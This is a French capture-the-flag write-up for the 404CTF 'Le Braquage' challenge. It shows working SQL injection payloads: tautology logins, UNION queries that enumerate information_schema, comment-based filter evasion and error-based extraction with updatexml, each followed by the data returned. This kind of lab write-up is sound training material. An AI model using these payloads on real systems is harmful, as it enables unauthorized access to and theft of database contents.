# Le Braquage

On se connecte au [site](https://le-braquage.404ctf.fr) et on y découvre trois portail d'accès qui semblent nous indiquer d'exploiter des **injections SQL**

## Première page : 
En execuatnt l'injection SQL : 
```sql
' OR '1'='1 
```

Dans le champ identifiant, on découvre le tableau : 

| Id | Pseudonyme | Téléphone | Adresse | Code |
| :-------------: | :-------------: | :-------------: | :-------------: | :-------------: |
| 1 | RIRI | 0145489625 | 5 avenue des groseilles | OpérationEpervier |
| 2 | FIFI | 0145889625 | 1 rue des myrtilles | OpérationFaucon |
| 3 | LOULOU | 0115789625 | 1 rue des pommes | OpérationFaucon |
| 456 | JAJA | 0145769625 | 1 rue des pommes | OpérationGorfou |
| 472 | RORO | 0189999625 | 5 boulevard des poires | OpérationFaucon |
| 7456 | TITI | 404CTF{0145769456} | 404CTF{21 rue des kiwis} | OpérationGorfou |
| 7865 | DEDE | 0145781225 | 3 avenue des oranges | OpérationMouette |
| 16579 | DIDI | 0145789625 | 1 rue des pommes | OpérationEpervier |

D'où les deux premiers Flags :
>404CTF{0145769456}

>404CTF{21 rue des kiwis}

---

## Deuxième page :

En executant l'injection :

```sql
 cn ' UNION select 1, schema_name from INFORMATION_SCHEMA.SCHEMATA -- -
```
On obtient le nom de la Database :

| Pseudo | Coopératives |
| :-------------: | :-------------: |
| 1 | UnionVendeurs |

On peut donc explorer les tables de cette Database :

```sql
cn' union select 1, table_name from information_schema.tables where table_schema='UnionVendeurs'-- -
```

On obtient le nom des la tables:

| Pseudo | Coopératives |
| :-------------: | :-------------: |
| 1 | Users |
| 1 | cooperatives |

Et en explorant la table Users :

```sql
cn' union select 1, column_name from information_schema.columns where table_name='Users'-- -
```
on obtient le nom des colonnes :

| Pseudo | Coopératives |
| :-------------: | :-------------: |
| 1 | id |
| 1 | nom |
| 1 | prenom |


Et finalment, en executant l'injection : 
```sql
cn' Union select nom, prenom from Users-- -
```
| Pseudo | Coopératives |
| :-------------: | :-------------: |
| Assin | Marc |
| Outan | Laurent |
| Gator | Ali |
| Reptile | Eric |
| Culé | Roland |
| 404CTF{Vereux} | 404CTF{UnGorfou} |
| Abbé | Oscar |
| Conda | Anna |

>À noter qu'il n'y a rien à exploiter dans la colonne id

On trouve deux nouveaux flags :

>404CTF{Vereux}

>404CTF{UnGorfou}
---
## Troisième page :
une simple injection sql avec des commentaires à la place des espaces pour eviter les filtres : 
```sql
'/**/OR/**/'1'='1 
```

| Code | Date | Heure |
| :-------------: | :-------------: | :-------------: |
| OpérationEpervier | 2021-11-02 | 19h |
| OpérationMouette | 2021-09-14 | 19h |
| OpérationFaucon | 2022-01-01 | 20h |
| OpérationGorfou | 404CTF{2022-07-14} | 404CTF{01hDuMatin} |

On récupère à nouveaux deux flags : 

>404CTF{2022-07-14}

>404CTF{01hDuMatin}


Il manque donc qu'une seule chose : **le mot de passe**...

après beaucoup de recherches on touve que sur la troisiemme page, les **erreurs passent avant le filtre** et donc en utilisant le bon payload, (merci [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md) encore une fois ...) on trouve  après énumération de la db: 
```sql
' and updatexml(null,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() LIMIT 1,1)),null)-- -
```

```text
Array(    [0] => HY000    [1] => 1105    [2] => XPATH syntax error: 'mdp')RequĂȘte invalide : ne pas mettre d'espace
```

la fameuse colonne ‘mdp’ est découverte et on obtient le mot de passe :

```sql
' and updatexml(null,concat(0x0a,(select mdp from Password LIMIT 5,1)),null)-- -
```

```text
Array(    [0] => HY000    [1] => 1105    [2] => XPATH syntax error: '404CTF{GorfousAuPouvoir}')RequĂȘte invalide : ne pas mettre d'espace
```


donc on a le flag final : 
>404CTF{VereuxUnGorfou014576945621ruedeskiwis2022-07-1401hDuMatinGorfousAuPouvoir}